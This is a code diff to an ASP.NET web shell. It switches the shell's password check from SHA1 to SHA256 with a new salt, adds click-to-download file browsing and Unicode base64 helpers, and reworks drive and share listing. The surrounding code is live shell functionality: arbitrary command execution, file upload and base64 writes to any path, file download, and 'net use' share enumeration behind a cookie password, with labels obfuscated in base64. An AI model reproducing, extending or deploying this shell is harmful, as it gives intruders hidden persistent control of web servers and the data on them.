@@ -38,10 +38,10 @@ case"exadd":exadd=a(exadd,fb(data3[1]));break;
 view();
     %>
 <script runat="server">
-    string salt="di2zag7wZHTK9YR0NGq";
+    string salt="sdfewq@#$51234234DF@#$!@#$ASDF";
     string p,pro,cmd,sav,vir,nen,upb,upd,del,don,hid,tfil,ttar,ttim,baseFile,baseAddr,baseVir,baseName,sqc,sqq,exadd;
     bool aut=false;
-    string pp="ePQm3HPXJYt5wZSFhktJ/IEin/A=";
+    string pp="J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
     string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
     string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
     string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
@@ -51,7 +51,7 @@ view();
 
     void rm(){/*System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);Response.Redirect(Request.RawUrl);*/}
     void c(string p){try{HttpCookie coo=new HttpCookie("p",tb(p));coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);c();}catch(Exception e){l(e.Message);}}
-    bool c(){try{if(HttpContext.Current.Request.Cookies["p"]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["p"].Value)+salt)))==pp;if(!aut)rm();return aut;}}catch(Exception e){l(e.Message);}rm();return false;}
+    bool c(){try{if(HttpContext.Current.Request.Cookies["p"]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["p"].Value)+salt)))==pp;if(!aut)rm();return aut;}}catch(Exception e){l(e.Message);}rm();return false;}
     void u(HttpPostedFile upl, string sav, bool vir, string nen){try{if(c()){if(upl!=null&&upl.ContentLength>0){string fn=string.IsNullOrEmpty(nen)?System.IO.Path.GetFileName(upl.FileName):nen;string path=vir?Server.MapPath(sav):sav;string SaveLocation=System.IO.Path.HasExtension(path)?path:path.TrimEnd('\\')+"\\"+fn;upl.SaveAs(SaveLocation);l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
     void baseupl(string baseFile,string baseAddr, bool baseVir){try{if(c()){if(baseFile!=null&&baseFile.Length>0&&!string.IsNullOrEmpty(baseAddr)){string SaveLocation=baseVir?Server.MapPath(baseAddr):baseAddr;System.IO.File.WriteAllBytes(SaveLocation,Convert.FromBase64String(baseFile));l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
     void r(string pro, string cmd){try{if(c()){string o = exec(cmd,pro);l(HttpUtility.HtmlEncode(o));}}catch(Exception ex){l(ex.Message);}}
@@ -107,7 +107,7 @@ view();
         {
             if (exadd.ToLower() == "root")
             {
-                ret = "{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";// in javascript json parser two \ = one \
+                ret = "{\"dir\":[\"\\\\\\\\localhost\"";// in javascript json parser two \ = one \
                 string netUse = exec("net use");
                 string[] lines = netUse.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                 foreach (string item in lines)
@@ -115,7 +115,7 @@ view();
                     if (item.ToLower().StartsWith("ok"))
                     {
                         int index = item.IndexOf("\\\\");
-                        ret += ",{\"name\":\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"}";
+                        ret += ",\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"";
                     }
                 }
                 ret += "]}";
@@ -135,7 +135,7 @@ view();
                             {
                                 if (isStart)
                                     ret += ",";
-                                ret += string.Format("{{\"name\":\"{0}$\",\"tsize\":\"{1}\",\"fsize\":\"{2}\",\"usize\":\"{3}\"}}",item.Name.TrimEnd('\\').TrimEnd(':'),sizeFix(item.TotalSize),sizeFix(item.TotalFreeSpace),sizeFix(item.TotalSize - item.TotalFreeSpace));
+                                ret += "\"" + item.Name.TrimEnd('\\').TrimEnd(':') + "$\"";
                                 isStart = true;
                             }
                         }
@@ -190,7 +190,7 @@ view();
         {
             if (i > 0)
                 json += ",";
-            json += "{\"name\":\"" + dir[i].Name + "\"}";
+            json += "\"" + dir[i].Name + "\"";
         }
         json += "]";
         return json;
@@ -223,7 +223,7 @@ view();
 <style>body,html{margin:0;padding:5px;direction:ltr;background:#aaa;color:#000 !important;}form{margin:0;}*{font:14px "Lucida Console";}t{width:180px;display:inline-block;text-align:right;padding-right:5px;}g{margin-left:30px;}input[type="text"],input[type="file"],textarea {width:60%;height:25px;background:#cbcbcb;color:#000;border:1px solid #999;margin-bottom:3px;}input[type="text"]{padding:2px;}input[type="button"],input[type="submit"] {height:23px;}input[type="checkbox"]{width:23px;height:24px;position:absolute;margin:0;}hr{margin:0;border:0;border-top:1px solid #DDD;}.h{width:100px;text-align:center;background:rgb(255,36,0);color:#fff;vertical-align:middle;}table{width:100%;margin:0;border-collapse:collapse;}.b{padding:10px 0px 9px;}</style>
 <script>
     function use() { var n = document; var d = n.getElementById("d").innerHTML; d = d.substring(0, d.lastIndexOf('\\') + 1); n.getElementsByName("cmd")[0].value += d; n.getElementsByName("sav")[0].value += d; n.getElementsByName("don")[0].value += d; }
-    function subm(){var mmm=document.getElementsByClassName('mmm');for(var i=0;i<mmm.length;i++){mmm[i].value=btoa(mmm[i].value);}}
+    function subm() { var mmm = document.getElementsByClassName('mmm'); for (var i = 0; i < mmm.length; i++) { mmm[i].value = b64EncodeUnicode(mmm[i].value);}}
     function reset() { document.cookie = "data=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/";location.href = location.pathname;}
 </script>
 <style>
@@ -257,64 +257,44 @@ view();
         padding: 5px;
         display: table;
         cursor: pointer;
-        /*margin-left: 100px;*/
-        float:left;
-        margin-left:5px;
+        margin-left: 100px;
     }
     .objF {
         margin-top: 5px;
         min-height: 24px;
     }
     .objS {
-        /*position: absolute;*/
+        position: absolute;
         width: 90px;
         text-align: right;
         cursor: default;
         background-color: #c3c3c3;
         padding: 5px;
         min-height:14px;
-        max-height: 14px;
-        overflow: hidden;
-        float:left;
     }
     .objN {
         display: table;
         padding: 5px;
         background-color: #23d7ff;
         margin-left: 100px;
-        cursor: default;
+        cursor: pointer;
     }
     .objB {
         margin-left:3px;
         padding:5px;
     }
-    /*.objL{display:inline-block;margin-left:3px;}*/
-    #objLocation{padding:0 5px 0 5px;
-                 min-height: 24px;
-    margin-top: 5px;
-    }
+    .objL{display:inline-block;margin-left:3px;}
+    #objLocation{padding:0 5px 0 5px;}
     .objLabel {
-        /*display: inline-block;
+        display: inline-block;
         padding: 5px;
         width: 87px;
         background-color: #c3c3c3;
         margin-top:5px;
-        float:left;*/
     }
     .objError {
         background-color: #ff2e2e;
         color: white;
-    }
-    .objInfo {
-        font-size: 10px;
-    background-color: #83cc83;
-    line-height: 14px;
-    }
-    .sizeLD {
-    width: 12px;
-    height: 12px;
-    margin-left: -54px;
-    margin-top: -2px;
     }
 </style>
 <script>
@@ -349,11 +329,11 @@ view();
         document.getElementById("loader").style.display = "inline-block";
         var address = document.getElementsByName("exadd")[0].value;
         var info = {
-            data:"exadd=" + btoa(address),
+            data: "exadd=" + b64EncodeUnicode(address),
             onSuccess:function(resText){
                 
                 document.getElementById("loader").style.display = "none";
-                var data = atob(resText)
+                var data = b64DecodeUnicode(resText)
                 makeLocation();
                 var Frame = document.getElementById("objFrame");
                 Frame.innerHTML = "";
@@ -364,6 +344,8 @@ view();
                 else
                 {
                     var info = JSON.parse(data);
+                    console.log(data);
+                    console.log(info);
                     if(info.dir)
                     {
                         var f = document.createElement("div");
@@ -371,9 +353,8 @@ view();
        
                         var s = document.createElement("div");
                         s.className="objS";
-                        s.innerText = "Get All Size";
+                        s.innerText = "Get All";
                         s.style.cursor = "pointer";
-                        s.style.fontSize = "12px";
                         s.onclick = function(){getAllSize();};
 
                         f.appendChild(s);
@@ -396,11 +377,8 @@ view();
         var loc = document.getElementById("objLocation");
         loc.innerHTML = "";
 
-        var f = document.createElement("div");
-        f.className="objF";
-
         var lbl = document.createElement("div");
-        lbl.className = "objS objLabel";
+        lbl.className = "objLabel";
         lbl.innerText = "Location :";
         loc.appendChild(lbl);
         var curAdd = document.getElementsByName("exadd")[0].value.split("\\");
@@ -421,7 +399,7 @@ view();
                     document.getElementsByName("exadd")[0].value = this.getAttribute("loc");
                     sendAddress();
                 };
-                o.className = "objD";
+                o.className = "objD objL";
             }
             o.innerText = curAdd[i] + "\\";
                         
@@ -444,22 +422,20 @@ view();
         parent.appendChild(d);
     }
 
-    function addFolder(parent, dir)
+    function addFolder(parent, name)
     {
         var f = document.createElement("div");
         f.className="objF";
        
         var d = document.createElement("div");
         d.className="objD";
-        d.innerText = dir.name;
+        d.innerText = name;
         d.onclick = function(){setAddress(this.innerText);};
 
         var s = document.createElement("div");
         s.className="objS dir";
-        if(sizeArray[getCurrentAddress()+"\\"+dir.name])
-            setSize(s,sizeArray[getCurrentAddress()+"\\"+dir.name]);
-        else if(dir.usize)
-            setSize(s,dir.usize);
+        if(sizeArray[getCurrentAddress()+"\\"+name])
+            setSize(s,sizeArray[getCurrentAddress()+"\\"+name]);
         else
             s.innerText = "...";
 
@@ -468,23 +444,6 @@ view();
 
         f.appendChild(s);
         f.appendChild(d);
-
-        if(dir.tsize)
-        {
-            var inf = document.createElement("div");
-            inf.className="objD objInfo";
-            inf.innerText = "Total Size : " + dir.tsize;
-            f.appendChild(inf);
-        }
-
-        if(dir.fsize)
-        {
-            var inf = document.createElement("div");
-            inf.className="objD objInfo";
-            inf.innerText = "Free Space : " + dir.fsize;
-            f.appendChild(inf);
-        }
-
         parent.appendChild(f);
     }
 
@@ -498,6 +457,7 @@ view();
         var n = document.createElement("div");
         n.className="objN";
         n.innerText=name;
+        n.onclick = function () { expDownload(this.innerText); };
 
         f.appendChild(s);
         f.appendChild(n);
@@ -511,6 +471,13 @@ view();
         if(address.value.endsWith("\\"))
             address.value = address.value.substring(0, address.value.length - 1);
         return address.value;
+    }
+
+    function expDownload(name) {
+        var path = getCurrentAddress() + "\\" + name;
+
+        document.getElementById("donInput").value = path;
+        document.getElementById("donSubmit").click();
     }
 
     function setAddress(name)
@@ -548,15 +515,19 @@ view();
     {
         objSize.innerText = "";
         var ldr = document.createElement("span");
-        ldr.className="loader sizeLD";
+        ldr.className="loader";
+        ldr.style.width="12px";
+        ldr.style.height="12px";
+        ldr.style.top="3px";
+        ldr.style.left="80px";
         objSize.appendChild(ldr);
         var address = getCurrentAddress() + "\\" + name;
         var info = {
-            data:"gsize=" + btoa(address),
+            data: "gsize=" + b64EncodeUnicode(address),
             onSuccess:function(resText){
                 
                 ldr.remove();
-                var data = atob(resText)
+                var data = b64DecodeUnicode(resText)
                 setSize(objSize, data)
                 if(!data.startsWith("Error"))
                     sizeArray[address] = data;
@@ -580,13 +551,7 @@ view();
 
     function setSize(obj, size)
     {
-        if(size.startsWith("Error"))
-        {
-            obj.title = size;
-            obj.innerText = "Error";
-        }
-        else
-            obj.innerText = size;
+        obj.innerText = size;
         if(size.endsWith("KB"))
             obj.style.backgroundColor = "#ece979";
         else if(size.endsWith("MB"))
@@ -608,6 +573,18 @@ view();
         xh.open("POST", location.pathname, true);
         xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         xh.send("p=" + readCookie("p") + "&" + data);
+    }
+
+    function b64DecodeUnicode(str) {
+        return decodeURIComponent(Array.prototype.map.call(atob(str), function (c) {
+            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
+        }).join(''))
+    }
+
+    function b64EncodeUnicode(str) {
+        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function (match, p1) {
+            return String.fromCharCode(parseInt(p1, 16))
+        }))
     }
 </script>
 </head>
@@ -682,8 +659,8 @@ view();
 <td class="h"><%=x("RG93bmxvYWQ=")%></td>
 <td class="b">
 <t><%=x("RmlsZSBuYW1l")%> :</t>
-<input name="don" type="text" />
-<input type="submit" value="<%= x("RG93bmxvYWQ=") %>" onclick="document.getElementsByName('don')[0].value = btoa(document.getElementsByName('don')[0].value);" />
+<input id="donInput" name="don" type="text" />
+<input id="donSubmit" type="submit" value="<%= x("RG93bmxvYWQ=") %>" onclick="document.getElementsByName('don')[0].value = b64EncodeUnicode(document.getElementsByName('don')[0].value);" />
 </td>
 </tr>
 </table>
@@ -760,7 +737,7 @@ view();
     </table>
     <hr />
     <div id="objLocation">
-        <div class="objS">Location :</div><div class="objD objL" onclick="setAddress(this.innerText);">root</div>
+        <div class="objLabel">Location :</div><div class="objD objL" onclick="setAddress(this.innerText);">root</div>
     </div>
     <div id="objFrame">
     </div>
